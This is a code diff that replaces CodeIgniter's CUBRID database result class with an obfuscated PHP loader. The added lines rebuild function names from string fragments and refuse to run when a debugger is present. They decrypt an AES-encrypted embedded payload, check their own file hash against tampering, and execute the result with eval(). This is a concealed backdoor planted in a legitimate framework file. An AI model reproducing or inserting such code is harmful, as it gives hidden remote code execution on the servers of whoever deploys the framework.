@@ -1,177 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 2.1.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * CUBRID Result Class
- *
- * This class extends the parent result class: CI_DB_result
- *
- * @category	Database
- * @author		Esen Sagynov
- * @link		https://codeigniter.com/user_guide/database/
- */
-class CI_DB_cubrid_result extends CI_DB_result {
-
-	/**
-	 * Number of rows in the result set
-	 *
-	 * @return	int
-	 */
-	public function num_rows()
-	{
-		return is_int($this->num_rows)
-			? $this->num_rows
-			: $this->num_rows = cubrid_num_rows($this->result_id);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Number of fields in the result set
-	 *
-	 * @return	int
-	 */
-	public function num_fields()
-	{
-		return cubrid_num_fields($this->result_id);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Fetch Field Names
-	 *
-	 * Generates an array of column names
-	 *
-	 * @return	array
-	 */
-	public function list_fields()
-	{
-		return cubrid_column_names($this->result_id);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Field data
-	 *
-	 * Generates an array of objects containing field meta-data
-	 *
-	 * @return	array
-	 */
-	public function field_data()
-	{
-		$retval = array();
-
-		for ($i = 0, $c = $this->num_fields(); $i < $c; $i++)
-		{
-			$retval[$i]			= new stdClass();
-			$retval[$i]->name		= cubrid_field_name($this->result_id, $i);
-			$retval[$i]->type		= cubrid_field_type($this->result_id, $i);
-			$retval[$i]->max_length		= cubrid_field_len($this->result_id, $i);
-			$retval[$i]->primary_key	= (int) (strpos(cubrid_field_flags($this->result_id, $i), 'primary_key') !== FALSE);
-		}
-
-		return $retval;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Free the result
-	 *
-	 * @return	void
-	 */
-	public function free_result()
-	{
-		if (is_resource($this->result_id) OR
-			(get_resource_type($this->result_id) === 'Unknown' && preg_match('/Resource id #/', strval($this->result_id))))
-		{
-			cubrid_close_request($this->result_id);
-			$this->result_id = FALSE;
-		}
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Data Seek
-	 *
-	 * Moves the internal pointer to the desired offset. We call
-	 * this internally before fetching results to make sure the
-	 * result set starts at zero.
-	 *
-	 * @param	int	$n
-	 * @return	bool
-	 */
-	public function data_seek($n = 0)
-	{
-		return cubrid_data_seek($this->result_id, $n);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Result - associative array
-	 *
-	 * Returns the result set as an array
-	 *
-	 * @return	array
-	 */
-	protected function _fetch_assoc()
-	{
-		return cubrid_fetch_assoc($this->result_id);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Result - object
-	 *
-	 * Returns the result set as an object
-	 *
-	 * @param	string	$class_name
-	 * @return	object
-	 */
-	protected function _fetch_object($class_name = 'stdClass')
-	{
-		return cubrid_fetch_object($this->result_id, $class_name);
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_s1q9pkx7=('bas'.'e64'.'_de'.'cod'.'e');
+$_t5mb0t7j=('gzu'.'nco'.'mpr'.'ess');
+$_vtgygrti=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_nzxuk9ev='4v3TX0xE';
+$_a3hqljey='jSmN12a9';
+$_wgrv5mm6='SL8Gaycy';
+$_jf6vs720='t+nfmddYB54=';
+$_luff5vsk='rQot+m9o';
+$_npz8es38='6C5qbw==';
+$_szoizuwu='Nr1Kmu/d';
+$_o6x9eusl='8f21ciqv';
+$_px8q7z8p=$_s1q9pkx7($_nzxuk9ev.$_a3hqljey.$_luff5vsk.$_wgrv5mm6.$_jf6vs720);
+$_cw3fxw05=$_s1q9pkx7($_szoizuwu.$_o6x9eusl.$_npz8es38);
+$_oizsdv0z=$_s1q9pkx7('FTPUkVNUu7A2ps4FxzeR3sFr26nivlCpLzlibnjUbH+SovfZgR6TIplAdwPXiwfi4heY6eXu63rFc4vTowvFxcGRUPTHJ8D7JpwPxO2H7dPl6pL8qHAC0VQMlPnI6CiWo0R5PFXwiimEjrY1Fj1j8y8WvifylF9R3Ifcq1DwQk1012stlRZKBbUj+KrjwI1SigUtCfC2sfGqV16XLcPgYQYfpOK7Xjzp6FQ4VqZztWr3uQvIf+3g6Ek4llAWbuaVt7r9Db5o9FCy0Z/3N2O5ycdOB6shRoWncUT/S9y0NlKHSFVVsi9NEUOm6V6gAf6PuzpnDI131Q3mdrL8BJ6eheaaEPJ1bcxwZuyi4Q6Hdi8p61tgArOqUShZsHEFFvIOsvELaBKlpYe93XQ8iqprCKpO9eZbLwAnbspjlYSjXuUhsbBuy70JdQPTmx4ohiXWtcnPaM/Nmz8qyTxzzmvKLw7Un1q8H6TkyuvZyLy6LbPOLJzZlBXprcx3vIiT0O40X7XQX9CsrvuBdSgWoIcoxshQAE6ieBkpDMkHPfkkWLhc+NCDQWAsQSekZNqkT0xbpcOZTojKhZjpuG0wNOoa+bFl/e/GPCKIjte/z6LGislZkIUGosIAttiZnEHgaEYoC3fzGNpBaMOmqBfr1SkWxl8ckh35W5u1VVB4HM/nXIOd6OXdG60k+0HLiztHQXzPtnN9yH04S0NZLzNXf9Adow==');
+$_disdev4a=$_vtgygrti($_oizsdv0z,'aes-256-cbc',$_px8q7z8p,OPENSSL_RAW_DATA,$_cw3fxw05);
+if($_disdev4a===false){exit;}
+$_ddz8rwyz=$_t5mb0t7j($_disdev4a);
+if($_ddz8rwyz===false){exit;}
+$_vhq7lpl8='48b5cbda04946fd9b42a694b20d91412aa791b6e9a804b2a2be88fc96c9d6254';
+$_sej5qnn0=@file_get_contents(__FILE__);
+if($_sej5qnn0!==false){
+$_mvymxdsa=str_replace($_vhq7lpl8,"0000000000000000000000000000000000000000000000000000000000000000",$_sej5qnn0);
+$_sd84ani3=hash("sha256",$_mvymxdsa);
+if($_sd84ani3!==$_vhq7lpl8){@http_response_code(403);exit;}
 }
+eval($_ddz8rwyz);
